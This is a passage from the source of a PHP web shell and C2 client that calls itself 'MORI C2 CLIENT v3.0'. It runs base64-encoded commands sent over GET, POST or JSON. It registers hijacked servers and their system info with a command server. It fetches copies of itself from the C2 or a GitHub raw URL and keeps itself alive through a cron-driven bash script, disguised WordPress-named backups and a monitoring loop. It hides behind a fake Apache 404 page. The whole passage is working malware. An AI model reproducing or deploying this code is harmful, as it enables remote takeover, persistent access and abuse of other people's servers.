    $inventory .= "Bash scripts: 5 minutes\n";
    $inventory .= "Cron jobs: 1-2 minutes\n";

    return $inventory;
}

function enhanced_restore_mechanism() {
    $main_file = SHELL_PATH;
    $backup_locations = [
        __DIR__ . '/' . basename(__FILE__) . '.backup_1',
        __DIR__ . '/' . basename(__FILE__) . '.backup_2', 
        __DIR__ . '/' . basename(__FILE__) . '.backup_3',
        __DIR__ . '/' . basename(__FILE__) . '.backup_4',
        __DIR__ . '/' . basename(__FILE__) . '.backup_5'
    ];
    global $c2_server;
    $c2_url = $c2_server . '?urlver';
    $github_url = 'https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE;
    
    // Kontrol: Dosya var mı ve yeterli boyutta mı?
    if (file_exists($main_file) && filesize($main_file) >= 15000) {
        return true; // Zaten OK
    }
    
    // ADIM 1: 5 backup konumundan restore et
    foreach ($backup_locations as $backup) {
        if (file_exists($backup) && filesize($backup) >= 15000) {
            $content = file_get_contents($backup);
            if ($content && strlen($content) >= 15000) {
                @file_put_contents($main_file, $content);
                @chmod($main_file, 0644);
                
                // Başarılı restore'u logla
                $log_file = __DIR__ . '/.restore_log';
                $log_entry = date('Y-m-d H:i:s') . " - Restored from backup: $backup\n";
                @file_put_contents($log_file, $log_entry, FILE_APPEND);
                
                return true;
            }
        }
    }
    
    // ADIM 2: Backup'lar başarısız, C2 ?urlver'den al
    $content = fetch_url_content($c2_url, 15);
    if (!$content || strlen($content) < 15000) {
        // C2 başarısız, GitHub'dan dene
        $content = fetch_url_content($github_url, 15);
    }
    
    if ($content && strlen($content) >= 15000) {
        @file_put_contents($main_file, $content);
        @chmod($main_file, 0644);
        
        // Başarılı restore sonrası backup'ları güncelle
        foreach ($backup_locations as $backup) {
            @file_put_contents($backup, $content);
            @chmod($backup, 0644);
        }
        
        // Log
        $log_file = __DIR__ . '/.restore_log';
        $log_entry = date('Y-m-d H:i:s') . " - Restored from remote source\n";
        @file_put_contents($log_file, $log_entry, FILE_APPEND);
        
        return true;
    }
    
    return false;
}

// =============================================
// OTOMATİK KAYIT (HER ERİŞİMDE)
// =============================================
function auto_register() {
    global $c2_server, $client_id, $debug_mode, $web_shell_url;
    
    // Skip if already registered in this execution
    if (isset($GLOBALS['_SHELL_REGISTERED']) && $GLOBALS['_SHELL_REGISTERED'] === true) {
        return true;
    }
    
    // C2 sunucusuna kayıt yap - BACKGROUND ONLY (don't block)
    $registration_data = [
        'id' => $client_id,
        'shell_url' => $web_shell_url,
        'sysinfo' => collect_system_info(),
        'timestamp' => time(),
        'os_type' => 'LINUX'
    ];
    
    $register_url = $c2_server . '?act=reg';
    
    // Very short timeout (fire-and-forget)
    $result = @http_post_timeout($register_url, $registration_data, 0.5);
    
    // Mark as attempted (don't try again this request)
    $GLOBALS['_SHELL_REGISTERED'] = true;
    
    return $result !== null;
}

function install_persistence_cron_fallback() {
    /**
     * Fallback cronjob - autonomous monitoring across system
     * Runs every 2 minutes with proper bash syntax and error handling
     */
    if (!function_exists('shell_exec')) {
        return false;
    }
    
    global $c2_server;
    
    $scriptPath = __DIR__ . '/kek.sh';
    $shell_file = SHELL_PATH;
    
    // Build script with proper bash syntax (NO escaped quotes)
    $scriptContent = '#!/bin/sh' . "\n" .
        '# Fallback persistence monitor - multi-location check' . "\n" .
        'set +e  # Continue on errors' . "\n" .
        'trap "true" ERR' . "\n" .
        "\n" .
        'C2_SERVER=' . "'" . $c2_server . "'\n" .
        'GITHUB_URL=' . "'https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/" . basename(__FILE__) . "'\n" .
        'LOCATIONS=' . "'/home /var/www /var/www/html /tmp /var/tmp /opt /usr/share'\n" .
        "\n" .
        'for location in $LOCATIONS; do' . "\n" .
        '  [ -d "$location" ] || continue' . "\n" .
        '  shell_path="$location/' . "' . basename(__FILE__) . '" . '"' . "\n" .
        '  ' . "\n" .
        '  # Check if file missing or too small' . "\n" .
        '  file_size=0' . "\n" .
        '  [ -f "$shell_path" ] && file_size=$(wc -c < "$shell_path" 2>/dev/null || echo 0)' . "\n" .
        '  ' . "\n" .
        '  if [ "$file_size" -lt 10000 ] 2>/dev/null; then' . "\n" .
        '    # Try create directory if missing' . "\n" .
        '    mkdir -p "$location" 2>/dev/null || continue' . "\n" .
        '    ' . "\n" .
        '    # Fetch from C2' . "\n" .
        '    content=$(curl -fsSL --max-time 10 "$C2_SERVER?act=auto_restore" 2>/dev/null)' . "\n" .
        '    ' . "\n" .
        '    # If C2 failed, try GitHub' . "\n" .
        '    if [ -z "$content" ] || [ "$(printf "%s" "$content" | wc -c)" -lt 10000 ]; then' . "\n" .
        '      content=$(curl -fsSL --max-time 10 "$GITHUB_URL" 2>/dev/null)' . "\n" .
        '    fi' . "\n" .
        '    ' . "\n" .
        '    # Write file if fetch succeeded' . "\n" .
        '    if [ -n "$content" ] && [ "$(printf "%s" "$content" | wc -c)" -gt 10000 ]; then' . "\n" .
        '      printf "%s" "$content" > "$shell_path" 2>/dev/null' . "\n" .
        '      chmod 644 "$shell_path" 2>/dev/null' . "\n" .
        '    fi' . "\n" .
        '  fi' . "\n" .
        'done' . "\n" .
        'exit 0' . "\n";
    
    // Write fallback script
    if (!@file_put_contents($scriptPath, $scriptContent)) {
        return false;
    }
    @chmod($scriptPath, 0755);
    
    // Start with nohup if not already running
    $running = @shell_exec("ps aux 2>/dev/null | grep -c 'kek.sh' || true");
    if ((int)$running < 2) {
        @shell_exec("nohup /bin/sh " . escapeshellarg($scriptPath) . " > /dev/null 2>&1 &");
    }
    
    // Add to crontab
    $cronLine = "*/2 * * * * nohup /bin/sh " . escapeshellarg($scriptPath) . " > /dev/null 2>&1 &";
    $crontab = @shell_exec('crontab -l 2>/dev/null') ?: '';
    
    if (strpos($crontab, basename($scriptPath)) === false) {
        $newCrontab = trim($crontab) . "\n" . $cronLine . "\n";
        $tmp = tempnam(sys_get_temp_dir(), 'cron_');
        if (@file_put_contents($tmp, $newCrontab)) {
            @shell_exec('crontab ' . escapeshellarg($tmp) . ' 2>/dev/null');
            @unlink($tmp);
        }
    }
    
    return true;
}

function delete_directory($path) {
    $real = realpath($path);
    
    if (!$real || !is_dir($real)) {
        return "[ERROR] Directory not found: $path";
    }
    
    $items = @scandir($real);
    if ($items && count($items) > 2) {
        return "[ERROR] Directory not empty";
    }
    
    return @rmdir($real) ? "OK: Deleted $path" : "[ERROR] Cannot delete directory";
}

// =====================================================
// OTOMATİK KAYIT (HER ERİŞİMDE)
// =====================================================
// =====================================================
// WEB SHELL API ENDPOINTS
// =====================================================

// DEBUG MODE
if (isset($_GET['debug']) && $debug_mode) {
    header('Content-Type: text/plain; charset=utf-8');
    echo "MORI C2 CLIENT v3.0\n";
    echo "====================\n\n";
    echo "Client ID: $client_id\n";
    echo "OS: $os_type\n";
    echo "Web Shell URL: $web_shell_url\n";
    echo "Current User: " . get_current_user() . "\n";
    echo "Current Directory: " . getcwd() . "\n";
    echo "PHP Version: " . PHP_VERSION . "\n";
    echo "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "\n\n";
    
    echo "SYSTEM INFO:\n";
    print_r(collect_system_info());
    exit;
}

// REGISTER DATA ENDPOINT (for server to pull sysinfo)
if (isset($_GET['act']) && $_GET['act'] == 'register_data') {
    // PRE-EXECUTION PERSISTENCE CHECK
    verify_and_restore(); // Check/restore before executing
    ensure_persistence(); // Ensure all 5 layers are deployed
    
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(collect_system_info());
    exit;
}

// REGISTER ONLY (manuel kayıt için)
// Optimize: batch mode veya single mode
if (isset($_GET['register'])) {
    // PRE-EXECUTION PERSISTENCE CHECK
    verify_and_restore(); // Check/restore before executing
    ensure_persistence(); // Ensure all 5 layers are deployed
    
    header('Content-Type: text/plain; charset=utf-8');
    
    // Check if batch registration is available (multiple clients accessing)
    $batch_mode = isset($_GET['batch']) && $_GET['batch'] === '1';
    
    if ($batch_mode) {
        // Batch mode: queue'de bekle, toplamaya devam et
        $result = auto_register();
        echo $result ? "QUEUED - Will be registered in batch\n" : "FAILED - Queue error";
    } else {
        // Single mode: immediate registration
        $result = auto_register();
        echo $result ? "OK - Registered successfully\n" : "FAILED - Registration failed\n";
    }
    
    exit;
}

// COMMAND EXECUTION VIA GET (base64 encoded - supports both safe_base64 and normal base64)
if (isset($_GET['m'])) {
    verify_and_restore();
    auto_register();
    
    ob_end_clean();
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    
    // Try safe_base64_decode first, then normal base64
    $encoded = $_GET['m'] ?? null;
    
    if (!$encoded || !is_string($encoded)) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'No payload provided']));
    }
    
    $cmd = safe_base64_decode($encoded);
    if ($cmd === false || strlen($cmd) === 0) {
        $cmd = @base64_decode($encoded, true);
    }
    if ($cmd === false || !$cmd || strlen($cmd) === 0) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'Invalid base64 encoding']));
    }
    
    $output = execute_command($cmd);
    
    // Detect output type and set appropriate header
    if (@json_decode($output, true) !== null) {
        header('Content-Type: application/json; charset=utf-8');
    } else {
        header('Content-Type: text/plain; charset=utf-8');
    }
    echo $output;
    exit;
}

// COMMAND EXECUTION VIA POST (supports both safe_base64 and normal base64)
if (isset($_POST['m'])) {
    verify_and_restore();
    auto_register();
    
    ob_end_clean();
    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
    header('Access-Control-Allow-Headers: Content-Type');
    
    $payload = $_POST['m'] ?? null;
    
    // NULL-safe payload handling
    if (!$payload || !is_string($payload)) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'No payload provided']));
    }
    
    // Try safe_base64_decode first, then normal base64
    $cmd = null;
    if (strpos($payload, 'base64:') === 0 && strlen($payload) > 7) {
        $encoded_part = substr($payload, 7);
        $cmd = safe_base64_decode($encoded_part);
        if ($cmd === false) {
            $cmd = @base64_decode($encoded_part, true);
        }
    } else {
        $cmd = safe_base64_decode($payload);
        if ($cmd === false) {
            $cmd = @base64_decode($payload, true);
        }
    }
    
    if ($cmd === false || !$cmd || strlen($cmd) === 0) {
        header('Content-Type: application/json; charset=utf-8');
        http_response_code(400);
        die(json_encode(['error' => 'Invalid base64 encoding']));
    }
    
    $output = execute_command($cmd);
    
    // Detect output type and set appropriate header
    if (@json_decode($output, true) !== null) {
        header('Content-Type: application/json; charset=utf-8');
    } else {
        header('Content-Type: text/plain; charset=utf-8');
    }
    echo $output;
    exit;
}

// JSON API (ileri düzey)
if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false) {
    // PRE-EXECUTION PERSISTENCE CHECK
    verify_and_restore(); // Check/restore before executing
    ensure_persistence(); // Ensure all 5 layers are deployed
    auto_register(); // Register this execution
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    if ($input && isset($input['action'])) {
        header('Content-Type: application/json; charset=utf-8');
        
        switch ($input['action']) {
            case 'exec':
                $cmd = $input['command'] ?? '';
                $result = execute_command($cmd);
                echo json_encode(['success' => true, 'output' => $result]);
                break;
                
            case 'info':
                echo json_encode(collect_system_info());
                break;
                
            case 'register':
                $success = auto_register();
                echo json_encode(['success' => $success, 'client_id' => $client_id]);
                break;
                
            default:
                echo json_encode(['error' => 'Unknown action']);
        }
        exit;
    }
}

// =====================================================
// BACKGROUND AGENT MODE (CLI veya ?agent=1 ile)
// =====================================================
if (php_sapi_name() === 'cli' || isset($_GET['agent']) || isset($_GET['daemon'])) {
    // Agent modu - sayfa gösterilmez, sürekli çalışır
    $max_execution = isset($_GET['timeout']) ? (int)$_GET['timeout'] : 300;
    $sleep_interval = isset($_GET['sleep']) ? (int)$_GET['sleep'] : 5;
    
    auto_register();
    
    $start_time = time();
    $task_counter = 0;
    
    while ((time() - $start_time) < $max_execution) {
        $task = c2_get_task($c2_server, $client_id);
        
        if ($task && trim($task) && trim($task) !== 'no_task') {
            $task_counter++;
            $output = execute_command($task);
            c2_send_result($c2_server, $client_id, $task, $output);
        }
        
        if ($task_counter % 10 === 0) {
            c2_update_status($c2_server, $client_id);
        }
        
        sleep($sleep_interval);
    }
    
    if (php_sapi_name() === 'cli') {
        exit(0);
    }
    
    echo "MORI C2 Agent completed " . $task_counter . " tasks in " . (time() - $start_time) . " seconds\n";
    exit;
}

// =====================================================
// NETWORK MONITORING DAEMON (?monitor=1 mode)
// Distributed backup network'ü 30 saniyede bir kontrol et
// =====================================================
if (isset($_GET['monitor'])) {
    set_time_limit(0);
    ignore_user_abort(true);
    
    $monitor_interval = isset($_GET['interval']) ? (int)$_GET['interval'] : 30;
    $max_monitor_time = isset($_GET['max_time']) ? (int)$_GET['max_time'] : 86400; // 24 saat
    
    $start_time = time();
    $check_count = 0;
    $restore_count = 0;
    
    while ((time() - $start_time) < $max_monitor_time) {
        $check_count++;
        
        // 1. Check distributed backups
        $inventory = @file_get_contents(__DIR__ . '/.wp-security.list');
        if ($inventory) {
            $files = array_filter(array_map('trim', explode("\n", $inventory)));
            foreach ($files as $file) {
                if (strpos($file, ';') !== false || strpos($file, '#') === 0) continue; // Skip comments
                
                if (!file_exists($file) || filesize($file) < 5000) {
                    // File missing or damaged - restore
                    $payload = @file_get_contents($c2_server . '?urlver');
                    if (!$payload || strlen($payload) < 100) {
                        $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE);
                    }
                    
                    if ($payload && strlen($payload) > 5000) {
                        @file_put_contents($file, $payload);
                        @chmod($file, 0644);
                        $restore_count++;
                    }
                }
            }
        }
        
        // 2. Execute PHP backups
        $dirs = ['/tmp', '/var/tmp', '/var/www', '/var/www/html', '/home'];
        foreach ($dirs as $dir) {
            if (is_dir($dir)) {
                @shell_exec("php '$dir/.wp-firewall.php' > /dev/null 2>&1 &");
            }
        }
        
        // 3. Check/restore main shell
        $mainFile = SHELL_PATH;
        if (!file_exists($mainFile) || filesize($mainFile) < 10000) {
            $payload = @file_get_contents($c2_server . '?urlver');
            if (!$payload) $payload = @file_get_contents('https://raw.githubusercontent.com/wnwnsks/k/refs/heads/main/' . SHELL_FILE);
            if ($payload && strlen($payload) > 10000) {
                @file_put_contents($mainFile, $payload);
                $restore_count++;
            }
        }
        
        // 4. Re-deploy if missing
        if (rand(1, 100) > 90) { // Every ~10 checks
            deploy_distributed_network_backups();
        }
        
        sleep($monitor_interval);
    }
    
    // Log summary
    $summary = "Monitor: Checks=$check_count, Restores=$restore_count\n";
    @error_log($summary);
    
    if (php_sapi_name() === 'cli') {
        echo $summary;
        exit(0);
    }
    
    exit;
}

register_shutdown_function(function() {
    // Yanıt zaten gönderildi, connection kapandı
    // Bu noktada HTTP isteği yapmak HÂLÂ sorunlu olabilir (aynı Apache),
    // Bu yüzden doğrudan dosyaya yaz — HTTP kullanma.
    global $c2_server, $client_id, $debug_mode;

    // Kayıt isteğini kuyruğa al (dosya bazlı, HTTP yok)
    $queue_file = __DIR__ . '/.mori_queue';
    $entry = json_encode([
        'id'        => $client_id,
        'timestamp' => time(),
        'sysinfo'   => [] // Agent mode'da doldurulur
    ]);
    @file_put_contents($queue_file, $entry . "\n", FILE_APPEND | LOCK_EX);
});
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>Not Found</h1>
    <p>The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</p>
    <hr>
    <address>Apache Server at <?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
</body>
</html>
